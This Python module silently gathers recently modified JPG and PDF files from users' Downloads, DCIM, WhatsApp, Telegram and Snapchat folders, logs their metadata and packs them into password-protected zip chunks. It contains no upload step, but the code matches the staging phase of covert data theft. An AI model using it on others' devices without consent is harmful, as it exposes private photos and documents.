from __future__ import annotations
import os
import json
import time
from pathlib import Path
from datetime import datetime, timedelta
from typing import List

import subprocess
import shutil

try:
    import pyminizip
except Exception:
    pyminizip = None


def _compress_with_password(files: List[str], dest: str, pwd: str) -> None:
    if pyminizip:
        try:
            pyminizip.compress_multiple(files, [], dest, pwd, 5)
            return
        except Exception:
            pass
    cmd = None
    if shutil.which("zip"):
        cmd = ["zip", "-j", "-P", pwd, dest, *files]
    elif os.name == "nt":
        seven = shutil.which("7z") or shutil.which("7za")
        if seven:
            cmd = [seven, "a", f"-p{pwd}", dest, *files]
    if cmd:
        subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def _chunked_archives(files: List[str], base: str, chunk_mb: int, pwd: str | None) -> List[str]:
    archives: List[str] = []
    limit = chunk_mb * 1024 * 1024
    batch: List[str] = []
    size_acc = 0
    idx = 1
    for f in files:
        fs = os.path.getsize(f)
        if size_acc + fs > limit and batch:
            name = f"{base}_{idx}.zip"
            if pwd:
                _compress_with_password(batch, name, pwd)
            else:
                subprocess.run(["zip", "-j", name, *batch], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            archives.append(name)
            batch = []
            size_acc = 0
            idx += 1
        batch.append(f)
        size_acc += fs
    if batch:
        name = f"{base}_{idx}.zip"
        if pwd:
            _compress_with_password(batch, name, pwd)
        else:
            subprocess.run(["zip", "-j", name, *batch], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        archives.append(name)
    return archives


def scan_log_and_zip(
    zip_file: str = "media_files.zip",
    password: str | None = None,
    log_file: str = "media_metadata.log",
    max_size_mb: int = 15,
    modified_within_days: int = 7,
) -> None:
    targets = [
        Path("/Download"),
        Path("/DCIM"),
        Path("/WhatsApp"),
        Path("/Telegram"),
        Path("/Snapchat"),
    ]
    home = Path.home()
    targets.extend([
        home / "Downloads",
        home / "DCIM",
        home / "WhatsApp",
        home / "Telegram",
        home / "Snapchat",
    ])
    if os.name == "nt":
        user = Path(os.environ.get("USERPROFILE", ""))
        if user:
            targets.extend([
                user / "Downloads",
                user / "DCIM",
                user / "WhatsApp",
                user / "Telegram",
                user / "Snapchat",
            ])

    exts = {".jpg", ".jpeg", ".pdf"}
    entries: List[dict] = []
    files: List[str] = []
    limit = max_size_mb * 1024 * 1024
    size_acc = 0
    cutoff = time.time() - modified_within_days * 86400
    for d in targets:
        if not d.exists():
            continue
        for f in d.rglob("*"):
            if not (f.is_file() and f.suffix.lower() in exts):
                continue
            st = f.stat()
            if st.st_mtime < cutoff:
                continue
            if size_acc + st.st_size > limit:
                continue
            size_acc += st.st_size
            entries.append({
                "path": str(f),
                "size": st.st_size,
                "mtime": datetime.fromtimestamp(st.st_mtime).isoformat(),
            })
            files.append(str(f))
    if entries:
        with open(log_file, "a", encoding="utf-8") as out:
            for e in entries:
                out.write(json.dumps(e) + "\n")
    if files:
        _chunked_archives(files, zip_file.rsplit(".", 1)[0], 10, password)


def scan_and_log(log_file: str = "media_metadata.log") -> None:
    scan_log_and_zip(log_file=log_file)
